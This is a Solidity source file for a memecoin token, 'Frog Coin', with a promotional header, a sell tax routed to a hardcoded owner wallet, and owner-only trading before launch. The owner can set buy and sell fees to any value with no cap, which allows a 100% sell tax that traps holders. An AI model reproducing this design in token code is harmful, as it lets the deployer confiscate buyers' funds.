/*
    🐸 Welcome to Frog Coin | $FROG (KYC'D TEAM) 🐸

    Socials:
    https://t.me/FrogCoinEntry

    https://twitter.com/thefrogcoineth

    https://thefrogcoin.net/

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Frog {
    string public constant name = "FrogCoin";  //
    string public constant symbol = "FrogCoin";  //
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    struct TradingFees{
        uint256 buyFee;
        uint256 sellFee;
    }

    TradingFees tradingFees = TradingFees(0,5);
    uint256 constant swapBackAmunt = totalSupply / 100;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    error AccessRestriction();
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
    address payable constant owner = payable(address(0x20d2340Cb248b476683c055569bd6Fa647D44076)); //

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        allowance[from][msg.sender] -= amount;        
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(tradingOpen || from == owner || to == owner);

        if(!tradingOpen && pair == address(0) && amount > 0)
            pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapBackAmunt){
            swapping = true;
            address[] memory path = new  address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapBackAmunt,
                0,
                path,
                address(this),
                block.timestamp
            );
            owner.transfer(address(this).balance);
            swapping = false;
        }

        if(from != address(this)){
            uint256 taxAmount = amount * (from == pair ? tradingFees.buyFee : tradingFees.sellFee) / 100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(!tradingOpen);
        if(msg.sender == owner)
            tradingOpen = true;           
        else     
            revert AccessRestriction();
    }

    function _updateTradingFees(uint256 _feeOnBuy, uint256 _feeOnSell) private {
        tradingFees = TradingFees(_feeOnBuy, _feeOnSell);
    }

    function updateTradingFees(uint256 _feeOnBuy, uint256 _feeOnSell) external {
        if(msg.sender == owner)        
            _updateTradingFees(_feeOnBuy, _feeOnSell);
        else
            revert AccessRestriction();
    }
}